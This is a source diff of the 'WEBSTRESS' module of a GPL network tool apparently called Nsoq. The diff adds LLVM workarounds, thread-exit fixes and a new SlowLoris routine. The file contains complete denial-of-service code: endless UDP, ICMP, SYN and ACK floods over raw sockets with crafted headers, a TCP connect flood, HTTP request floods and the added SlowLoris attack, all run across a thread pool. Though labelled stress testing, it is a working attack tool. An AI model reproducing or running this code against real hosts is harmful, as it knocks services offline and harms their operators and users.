@@ -1,12 +1,12 @@
 /*......,,,,,,,.............................................................
 *
 * @@NAME:     Module WEBSTRESS
-* @@VERSION:  1.0.3
-* @@DESC:     Webstress source file (this file is part of MpTcp tool).
+* @@VERSION:  1.0.4
+* @@DESC:     WEBSTRESS source file (this file is part of Nsoq tool).
 * @@AUTHOR:   Felipe Ecker (Khun) <khun@hexcodes.org>
-* @@DATE:     23/12/2012 00:50:00
+* @@DATE:     18/10/2012 16:30:00
 * @@MANIFEST:
-*      Copyright (C) Felipe Ecker 2003-2013.
+*      Copyright (C) Felipe Ecker 2003-2014.
 *      You should have received a copy of the GNU General Public License 
 *      inside this program. Licensed under GPL 3
 *      If not, write to me an e-mail please. Thank you.
@@ -34,7 +34,12 @@ inline static void __packing( const uint32 __type,
       uint8 proto;
       uint16 tcpsiz;
       struct tcphdr tcp;
+/* llvm doesnt support variable size in structure */
+#ifdef __llvm__
+      uchar data[52 - (SIZE_IP + SIZE_TCP)];
+#else
       uchar data[size - (SIZE_IP + SIZE_TCP)];
+#endif
    } __packed__ tcpaux;   
 
    struct __auxhdr2 {
@@ -44,8 +49,12 @@ inline static void __packing( const uint32 __type,
       uint8 proto;
       uint16 udpsiz;
       struct udphdr udp;
+/* llvm doesnt support variable size in structure */
+#ifdef __llvm__
+      uchar data[40 - (SIZE_IP + SIZE_UDP)];
+#else
       uchar data[size - (SIZE_IP + SIZE_UDP)];
-
+#endif
    } __packed__ udpaux;
 
 #if !defined(__BSD_SYSTEM__)
@@ -205,7 +214,7 @@ inline static void __packing( const uint32 __type,
 
 
 #if !defined(WEAK_GCC) 
-__hot__ inline static void __udp_stress() {
+__call__ inline static void __udp_stress() {
 #else
 inline static void __udp_stress() {
 #endif
@@ -214,7 +223,10 @@ inline static void __udp_stress() {
 
    pthread_mutex_lock(&__mutex);
    /* RAW socket*/
-   if ( !( sock = __socketPool(true, 0, false)) ) return;
+   if ( !( sock = __socketPool(true, 0, false)) ) {
+      pthread_mutex_unlock(&__mutex);
+      pthread_exit(NULL);
+   }
    pthread_mutex_unlock(&__mutex);
 
    __set_hdrincl(sock);
@@ -233,14 +245,16 @@ inline static void __udp_stress() {
    register struct sockaddr_in *targ = _data.target;
 
    __SEND:
-   sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
-   __packing(WEB_UDP, cbuffer, (uint32) sizeof(cbuffer), _data.source, _data.target);
+      sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
+      __packing(WEB_UDP, cbuffer, (uint32) sizeof(cbuffer), _data.source, _data.target);
    goto __SEND;
+
+   pthread_exit(NULL);
 }
 
 
 #if !defined(WEAK_GCC) 
-__hot__ inline static void __tcp_stress() {
+__call__ inline static void __tcp_stress() {
 #else
 inline static void __tcp_stress() {
 #endif
@@ -249,7 +263,10 @@ inline static void __tcp_stress() {
 
    pthread_mutex_lock(&__mutex);
    /* RAW socket*/
-   if ( !( sock = __socketPool(false, __TCP_MODE__, true)) ) return;
+   if ( !( sock = __socketPool(false, __TCP_MODE__, true)) ) {
+      pthread_mutex_unlock(&__mutex);
+      pthread_exit(NULL);
+   }
    pthread_mutex_unlock(&__mutex);
 
    __set_nonblock(sock);
@@ -260,8 +277,8 @@ inline static void __tcp_stress() {
    show("Connecting to host on port %d...\n", pkt->port);
    connect(sock, (struct sockaddr *) targ, tsize);
 
-   auto struct timeval _times;
-   auto fd_set beep, wr;
+   struct timeval _times;
+   fd_set beep, wr;
    _times.tv_sec = 5;
    _times.tv_usec = 0;
    FD_ZERO(&beep);
@@ -272,7 +289,7 @@ inline static void __tcp_stress() {
    if ( select(sock+1, &beep, &wr, NULL, &_times) != 1) {
       log("Unable to connect on host. Closed port ??\n");
       kill(getpid(), SIGALRM);
-      return;
+      pthread_exit(NULL);
    }
 
    close(sock);
@@ -294,11 +311,13 @@ inline static void __tcp_stress() {
       send(sock, data, size, MSG_OOB);
       close(sock);
    goto __CONNECT;
+
+   pthread_exit(NULL);
 }
 
 
 #if !defined(WEAK_GCC) 
-__hot__ inline static void __http_stress() {
+__call__ inline static void __http_stress() {
 #else
 inline static void __http_stress() {
 #endif
@@ -307,24 +326,31 @@ inline static void __http_stress() {
 
    pthread_mutex_lock(&__mutex);
    /* RAW socket*/
-   if ( !( sock = __socketPool(false, __TCP_MODE__, true)) ) return;
+   if ( !( sock = __socketPool(false, __TCP_MODE__, true)) ) {
+      pthread_mutex_unlock(&__mutex);
+      pthread_exit(NULL);
+   }
    pthread_mutex_unlock(&__mutex);
 
    __set_nonblock(sock);
+   __set_keepalive(sock);
 
    register uint8 tsize = sizeof(struct sockaddr);
    register struct sockaddr_in *targ = _data.target;
 
-   auto char __http[1024];
+   char __http[1024];
    memset(__http, 0, sizeof(__http));
    snprintf(__http, sizeof(__http) - 1, 
-   "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", pkt->dst);
+      "GET / HTTP/1.1\r\n"
+      "Host: %s\r\n"
+      "User-Agent: Nsoq Signature\r\n"
+      "Keep-Alive: 10000\r\n\r\n", pkt->dst);
 
    show("Connecting to host on port %d...\n", pkt->port);
    connect(sock, (struct sockaddr *) targ, tsize);
 
-   auto struct timeval _times;
-   auto fd_set beep, wr;
+   struct timeval _times;
+   fd_set beep, wr;
    _times.tv_sec = 5;
    _times.tv_usec = 0;
    FD_ZERO(&beep);
@@ -336,7 +362,7 @@ inline static void __http_stress() {
       log("Unable to connect on host. Closed port ??\n");
       log("[Timeout]\n");
       kill(getpid(), SIGALRM);
-      return;
+      pthread_exit(NULL);
    } 
 
    close(sock);
@@ -344,8 +370,8 @@ inline static void __http_stress() {
    register char *data = __http;
    register uint16 size = strlen(__http);
 
-   show("[Connectd]\n");
-   show("[WEB STRESS] Making HTTP Requests on host [%s] on port %d...\n", 
+   show("[Connected]\n");
+   show("[WEB STRESS] Making HTTP Requests to host [%s] on port %d...\n", 
    pkt->dst, pkt->port);
 
    __WEB:
@@ -356,11 +382,13 @@ inline static void __http_stress() {
       usleep(40000);
       close(sock);
    goto __WEB;
+
+   pthread_exit(NULL);
 }
 
 
 #if !defined(WEAK_GCC) 
-__hot__ inline static void __icmp_stress() {
+__call__ inline static void __icmp_stress() {
 #else
 inline static void __icmp_stress() {
 #endif
@@ -369,7 +397,10 @@ inline static void __icmp_stress() {
 
    pthread_mutex_lock(&__mutex);
    /* ICMP RAW socket*/
-   if ( !( sock = __socketPool(false, __ICMP_MODE__, false)) ) return;
+   if ( !( sock = __socketPool(false, __ICMP_MODE__, false)) ) {
+      pthread_mutex_unlock(&__mutex);
+      pthread_exit(NULL);
+   }
    pthread_mutex_unlock(&__mutex);
 
    __set_broadcast(sock);
@@ -387,13 +418,15 @@ inline static void __icmp_stress() {
    register struct sockaddr_in *targ = _data.target;
 
    __SENDING:
-   sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
+      sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
    goto __SENDING;
+
+   pthread_exit(NULL);
 }
 
 
 #if !defined(WEAK_GCC) 
-__hot__ inline static void __syn_stress() {
+__call__ inline static void __syn_stress() {
 #else
 inline static void __syn_stress() {
 #endif
@@ -402,7 +435,10 @@ inline static void __syn_stress() {
 
    pthread_mutex_lock(&__mutex);
    /* RAW socket*/
-   if ( !( sock = __socketPool(true, 0, false)) ) return;
+   if ( !( sock = __socketPool(true, 0, false)) ) {
+      pthread_mutex_unlock(&__mutex);
+      pthread_exit(NULL);
+   }
    pthread_mutex_unlock(&__mutex);
 
    __set_hdrincl(sock);
@@ -421,14 +457,16 @@ inline static void __syn_stress() {
    register struct sockaddr_in *targ = _data.target;
 
    __LOAD:
-   sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
-   __packing(WEB_TCP, cbuffer, (uint16) sizeof(cbuffer), _data.source, _data.target);
+      sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
+      __packing(WEB_TCP, cbuffer, (uint16) sizeof(cbuffer), _data.source, _data.target);
    goto __LOAD;
+
+   pthread_exit(NULL);
 }
 
 
 #if !defined(WEAK_GCC) 
-__hot__ inline static void __ack_stress() {
+__call__ inline static void __ack_stress() {
 #else
 inline static void __ack_stress() {
 #endif
@@ -437,7 +475,10 @@ inline static void __ack_stress() {
 
    pthread_mutex_lock(&__mutex);
    /* RAW socket*/
-   if ( !( sock = __socketPool(true, 0, false)) ) return;
+   if ( !( sock = __socketPool(true, 0, false)) ) {
+      pthread_mutex_unlock(&__mutex);
+      pthread_exit(NULL);
+   }
    pthread_mutex_unlock(&__mutex);
 
    __set_hdrincl(sock);
@@ -456,9 +497,82 @@ inline static void __ack_stress() {
    register struct sockaddr_in *targ = _data.target;
 
    __LOADING:
-   sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
-   __packing(WEB_TCP, cbuffer, (uint16) sizeof(cbuffer), _data.source, _data.target);
+      sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
+      __packing(WEB_TCP, cbuffer, (uint16) sizeof(cbuffer), _data.source, _data.target);
    goto __LOADING;
+
+   pthread_exit(NULL);
+}
+
+
+#if !defined(WEAK_GCC) 
+__call__ inline static void __slow_stress() {
+#else
+inline static void __slow_stress() {
+#endif
+
+   register uint32 sock;
+
+   pthread_mutex_lock(&__mutex);
+   /* RAW socket*/
+   if ( !( sock = __socketPool(false, __TCP_MODE__, true)) ) {
+      pthread_mutex_unlock(&__mutex);
+      pthread_exit(NULL);
+   }
+   pthread_mutex_unlock(&__mutex);
+
+   __set_nonblock(sock);
+   __set_keepalive(sock);
+
+   register uint8 tsize = sizeof(struct sockaddr);
+   register struct sockaddr_in *targ = _data.target;
+
+   char __http[1024];
+   memset(__http, 0, sizeof(__http));
+   snprintf(__http, sizeof(__http) - 1,
+      "GET / HTTP/1.1\r\n"
+      "Host: %s\r\n"
+      "User-Agent: Nsoq Signature\r\n"
+      "Keep-Alive: 900\r\n", pkt->dst);
+
+   show("Connecting to host on port %d...\n", pkt->port);
+   connect(sock, (struct sockaddr *) targ, tsize);
+
+   struct timeval _times;
+   fd_set beep, wr;
+   _times.tv_sec = 5;
+   _times.tv_usec = 0;
+   FD_ZERO(&beep);
+   FD_ZERO(&wr);
+   FD_SET(sock, &beep);
+   FD_SET(sock, &wr);
+
+   if ( select(sock+1, &beep, &wr, NULL, &_times) != 1) {
+      log("Unable to connect on host. Closed port ??\n");
+      log("[Timeout]\n");
+      kill(getpid(), SIGALRM);
+      pthread_exit(NULL);
+   }
+
+   close(sock);
+   signal(SIGPIPE, SIG_IGN);
+
+   register char *data = __http;
+   register uint16 size = strlen(__http);
+
+   show("[Connected]\n");
+   show("[WEB STRESS] Making SlowLoris HTTP Requests to host [%s] on port %d...\n",
+   pkt->dst, pkt->port);
+
+   __WEB:
+      sock = socket(AF_INET, SOCK_STREAM, 0);
+      __set_keepalive(sock);
+      connect(sock, (struct sockaddr *) targ, tsize);
+      send(sock, data, size, 0);
+      usleep(100000);
+   goto __WEB;
+
+   pthread_exit(NULL);
 }
 
 
@@ -480,11 +594,11 @@ bool web( const char **pull __unused__ ) {
    else if (pkt->webType & WEB_ICMP) func = &__icmp_stress;
    else if (pkt->webType & WEB_SYN) func = &__syn_stress;
    else if (pkt->webType & WEB_ACK) func = &__ack_stress;
+   else if (pkt->webType & WEB_SLOW) func = &__slow_stress;
    else func = NULL;
 
    if ( !__threadPool(pkt->numThreads, func, NULL) ) return false;
 
-   pthread_exit(0);
    return true;
 }
 
